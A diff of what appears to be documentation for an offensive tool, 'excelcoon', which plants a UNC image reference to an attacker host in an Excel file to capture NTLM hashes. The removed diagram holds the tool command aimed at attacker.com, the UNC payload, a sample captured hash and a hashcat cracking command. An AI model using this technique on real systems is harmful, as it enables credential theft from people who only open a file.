@@ -15,37 +15,7 @@ This is the same underlying mechanism exploited by [HorriblePDF](/attacks/Horrib
 
 ## Attack Flow
 
-```
-  Attacker                          Victim
-  ────────                          ──────
-  excelcoon -m webdav               
-  -H attacker.com                   
-       │                              
-       ▼                              
-  quarterly_report.xlsx ──────────► Opens in Excel
-                                       │
-                                       ▼
-                              Excel parses OOXML
-                              Finds external image ref:
-                              \\attacker.com@80\img.png
-                                       │
-                                       ▼
-                              Windows WebClient service
-                              converts UNC → HTTP request
-                                       │
-  ┌────────────────────────────────────┘
-  │
-  ▼
-  Capture Server (port 80)
-  ← HTTP 401 (WWW-Authenticate: NTLM)
-  → NTLM Type 1 (Negotiate)
-  ← NTLM Type 2 (Challenge)
-  → NTLM Type 3 (Authenticate)  ◄── Hash captured
-  
-  jsmith::CORP:1122334455667788:c657...
-  
-  $ hashcat -m 5600 hash.txt rockyou.txt
-```
+![](/images/excelcoon_flow.png)
 
 The critical insight: Windows automatically sends NTLM credentials when resolving UNC paths. The WebClient service (enabled by default on workstations) converts `\\host@80\path` into an HTTP request with NTLM authentication. No user interaction beyond opening the file.
 
